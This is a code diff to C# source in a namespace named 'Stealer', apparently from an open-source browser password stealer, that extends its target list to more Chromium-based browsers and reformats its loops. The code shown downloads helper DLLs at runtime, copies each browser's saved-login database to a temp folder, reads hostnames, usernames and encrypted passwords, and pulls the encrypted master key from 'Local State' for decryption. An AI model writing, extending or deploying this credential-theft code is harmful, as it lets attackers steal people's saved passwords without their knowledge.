@@ -13,13 +13,12 @@ namespace Stealer
         {
             string[] dlls = new string[2]
             {
-                "https://raw.githubusercontent.com/LimerBoy/ChromeDecrypT0r/master/Stealer/Stealer/modules/libs/libsodium.dll",
-                "https://raw.githubusercontent.com/LimerBoy/ChromeDecrypT0r/master/Stealer/Stealer/modules/libs/libsodium-64.dll"
+                "https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll",
+                "https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll"
             };
 
-            foreach(string dll in dlls){
-                if (!File.Exists(Path.GetFileName(dll)))
-                {
+            foreach(string dll in dlls) {
+                if (!File.Exists(Path.GetFileName(dll))) {
                     System.Net.WebClient client = new System.Net.WebClient();
                     client.DownloadFile(dll, Path.GetFileName(dll));
                 }
@@ -44,9 +43,11 @@ namespace Stealer
             string[] chromiumBasedBrowsers = new string[]
             {
                 l_a + "Google\\Chrome" + u_s,
+                l_a + "Google(x86)\\Chrome" + u_s,
                 l_a + "Chromium" + u_s,
                 a_a + "Opera Software\\Opera Stable\\Login Data",
-                l_a + "Google(x86)\\Chrome\\User Data\\Default",
+                l_a + "BraveSoftware\\Brave-Browser" + u_s,
+                l_a + "Epic Privacy Browser" + u_s,
                 l_a + "Amigo" + u_s,
                 l_a + "Vivaldi" + u_s,
                 l_a + "Orbitum" + u_s,
@@ -55,6 +56,7 @@ namespace Stealer
                 l_a + "Comodo\\Dragon" + u_s,
                 l_a + "Torch" + u_s,
                 l_a + "Comodo" + u_s,
+                l_a + "Slimjet" + u_s,
                 l_a + "360Browser\\Browser" + u_s,
                 l_a + "Maxthon3" + u_s,
                 l_a + "K-Melon" + u_s,
@@ -67,13 +69,10 @@ namespace Stealer
             };
             
             // Search all browsers
-            foreach (string browser in chromiumBasedBrowsers)
-            {
-                if (File.Exists(browser))
-                {
+            foreach (string browser in chromiumBasedBrowsers) {
+                if (File.Exists(browser)) {
                     tempDatabaseLocation = Environment.GetEnvironmentVariable("temp") + "\\browserDatabase";
-                    if (File.Exists(tempDatabaseLocation))
-                    {
+                    if (File.Exists(tempDatabaseLocation)) {
                         File.Delete(tempDatabaseLocation);
                     }
                     File.Copy(browser, tempDatabaseLocation);
@@ -85,50 +84,40 @@ namespace Stealer
                 cSQLite sSQLite = new cSQLite(tempDatabaseLocation);
                 sSQLite.ReadTable("logins");
 
-                for (int i = 0; i < sSQLite.GetRowCount(); i++)
-                {
+                for (int i = 0; i < sSQLite.GetRowCount(); i++) {
                     // Get data from database
                     string hostname = sSQLite.GetValue(i, 0);
                     string username = sSQLite.GetValue(i, 3);
                     string password = sSQLite.GetValue(i, 5);
 
                     // If no data => break
-                    if (string.IsNullOrEmpty(password))
-                    {
+                    if (string.IsNullOrEmpty(password)) {
                         break;
                     }
 
                 // If Chromium version > 80
-                    if (password.StartsWith("v10") || password.StartsWith("v11"))
-                    {
+                    if (password.StartsWith("v10") || password.StartsWith("v11")) {
                         // Get masterkey location
                         string masterKey, masterKeyPath = "";
-                        foreach (string l_s in new string[] { "", "\\..", "\\..\\.." })
-                        {
+                        foreach (string l_s in new string[] { "", "\\..", "\\..\\.." }) {
                             masterKeyPath = Path.GetDirectoryName(browser) + l_s + "\\Local State";
-                            if (File.Exists(masterKeyPath))
-                            {
+                            if (File.Exists(masterKeyPath)) {
                                 break;
-                            }
-                            else
-                            {
+                            } else {
                                 masterKeyPath = null;
                                 continue;
                             }
                         }
                         // If masterKey location file not found.
-                        if (string.IsNullOrEmpty(masterKeyPath))
-                        {
+                        if (string.IsNullOrEmpty(masterKeyPath)) {
                             break;
                         }
                         // Get master key
                         masterKey = File.ReadAllText(masterKeyPath);
                         string[] lines = System.Text.RegularExpressions.Regex.Split(masterKey, "\"");
                         int index = 0;
-                        foreach (string line in lines)
-                        {
-                            if (line == "encrypted_key")
-                            {
+                        foreach (string line in lines) {
+                            if (line == "encrypted_key") {
                                 masterKey = lines[index + 2];
                                 break;
                             }
@@ -167,8 +156,9 @@ namespace Stealer
                         continue;
                     }
                 }
+            continue;
             }
-            return passwords;
+        return passwords;
         }
     }
 }
